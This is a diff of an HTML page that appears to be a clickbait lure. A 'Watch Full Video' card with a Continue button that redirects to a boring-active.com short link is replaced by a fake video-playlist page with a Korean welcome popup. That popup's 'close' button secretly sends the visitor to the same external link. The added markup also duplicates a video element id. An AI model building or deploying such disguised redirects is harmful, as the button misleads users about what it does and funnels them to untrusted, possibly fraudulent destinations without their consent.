@@ -11,83 +11,52 @@
   gtag('config', 'G-C5W716M650');
 </script>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Watch Full Video</title>
-
-<meta property="og:title" content="Watch Full Video">
-<meta property="og:description" content="Tap to continue">
-<meta property="og:type" content="website">
-<meta property="og:image" content="https://yourdomain.com/cover.jpg">
-
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Video Playlist</title>
 <style>
-body{
-margin:0;
-background:#111;
-font-family:Arial,sans-serif;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-color:#fff;
-}
-
-.box{
-width:90%;
-max-width:420px;
-background:#222;
-padding:20px;
-border-radius:15px;
-text-align:center;
-}
-
-img{
-width:100%;
-border-radius:12px;
-}
-
-h2{
-margin-top:15px;
-}
-
-button{
-margin-top:20px;
-width:100%;
-padding:16px;
-font-size:20px;
-border:none;
-border-radius:10px;
-background:#ff2d55;
-color:white;
-cursor:pointer;
-font-weight:bold;
-}
-
-button:hover{
-background:#ff1744;
-}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,sans-serif;background:#111;color:#fff;display:flex;height:100vh;overflow:hidden}
+.sidebar{width:300px;background:#1b1b1b;overflow:auto}
+.item{padding:12px;border-bottom:1px solid #333;cursor:pointer}
+.item.active{background:#ff0033}
+.main{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+video{width:100%;max-width:900px;max-height:75vh;background:#000;border-radius:10px}
+.controls{margin-top:12px;display:flex;gap:10px;flex-wrap:wrap}
+button{padding:10px 16px;background:#ff0033;color:#fff;border:0;border-radius:8px;cursor:pointer;font-size:28px;font-weight:bold;padding:15px 30px}
+.popup{position:fixed;inset:0;background:rgba(0,0,0,.8);display:flex;align-items:center;justify-content:center}
+.popup-box{background:#222;padding:25px;border-radius:12px;text-align:center}
+@media(max-width:768px){body{flex-direction:column}.sidebar{width:100%;height:220px}}
 </style>
 </head>
-
 <body>
-
-<div class="box">
-
-<img src="https://pdpd.b-cdn.net/prod/thumb/d98f50d5-5968-4aae-a470-eda9d64d1ca2/thumbnail.jpg">
-
-<h2>Watch Full Video</h2>
-
-<p>Tap Continue to watch.</p>
-
-<button onclick="go()">▶ Continue</button>
-
-</div>
-
+<div class="popup" id="popup"><div class="popup-box"><h2>🎬 환영합니다</h2><p>시작하려면 닫기를 클릭하세요..</p><button onclick="closePopup()">닫기</button></div></div>
+<div class="sidebar" id="playlist"></div>
+<div class="main">
+<video id="player" controls autoplay muted playsinline></video>
+<video id="player" controls></video>
+<div class="controls">
+<button onclick="prevVideo()">⏮ Prev</button>
+<button onclick="nextVideo()">Next ⏭</button>
+<button onclick="toggleShuffle()">🔀 Shuffle</button>
+<button onclick="toggleRepeat()">🔁 Repeat</button>
+</div></div>
 <script>
-function go(){
-window.location.href="https://boring-active.com/7B6FQd";
-}
+const videos=[
+"https://cdn.videy.co/ngVHH4RJ1.mp4",
+"https://cdn.videy.co/WWKWMEBj1.mp4",
+"https://cdn.videy.co/HgK0qgDP1.mp4"
+];
+let current=0,shuffle=false,repeat=false;
+const p=document.getElementById('player'),list=document.getElementById('playlist');
+videos.forEach((v,i)=>{let d=document.createElement('div');d.className='item';d.textContent='🎬 Video '+(i+1);d.onclick=()=>loadVideo(i);list.appendChild(d);});
+// Auto play first video behind popup
+loadVideo(0);
+function loadVideo(i){current=i;p.src=videos[i];p.play();document.querySelectorAll('.item').forEach((e,n)=>e.classList.toggle('active',n===i));}
+function nextVideo(){if(repeat){loadVideo(current);return;}current=shuffle?Math.floor(Math.random()*videos.length):(current+1)%videos.length;loadVideo(current);}
+function prevVideo(){current=(current-1+videos.length)%videos.length;loadVideo(current);}
+function toggleShuffle(){shuffle=!shuffle;alert('Shuffle '+(shuffle?'ON':'OFF'));}
+function toggleRepeat(){repeat=!repeat;alert('Repeat '+(repeat?'ON':'OFF'));}
+function closePopup(){document.getElementById('popup').style.display='none';loadVideo(0);window.location.href='https://boring-active.com/7B6FQd';}
+p.onended=nextVideo;
 </script>
-
-</body>
-</html>
+</body></html>
